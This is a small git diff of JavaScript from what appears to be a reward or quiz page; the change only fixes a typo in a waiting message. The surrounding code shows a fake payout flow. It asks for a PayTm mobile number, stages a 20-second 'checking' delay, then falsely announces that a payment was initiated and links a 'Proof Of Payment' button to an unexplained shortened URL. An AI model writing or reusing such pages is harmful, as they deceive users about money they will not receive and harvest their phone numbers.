@@ -24,7 +24,7 @@ function goToPaytm(){
      document.getElementById('questions').innerHTML = `<center><p class='topic'>Enter Your PayTm Mobile Number<br><br><input id="num" type='number' min='10' max'10' required><br><span id="status"></span><br><button id='paytm' onclick='sucess()' type='submit'> Withdraw </button></center>`;
 }
 function sucess(){
-      document.getElementById('questions').innerHTML = "<center><p class='topic'>Please bear with us for 20 seconds more <br><br>we sre checking your information before proceding <br><br>Wait for 20 Seconds</p></center>";
+      document.getElementById('questions').innerHTML = "<center><p class='topic'>Please bear with us for 20 seconds more <br><br>we sre checking your information before procceding <br><br>Wait for 20 Seconds</p></center>";
      setTimeout(function(){
        document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span><br><a href="http://fumacrom.com/MJif">Proof Of Payment</a></center>`;
      }, 20000);
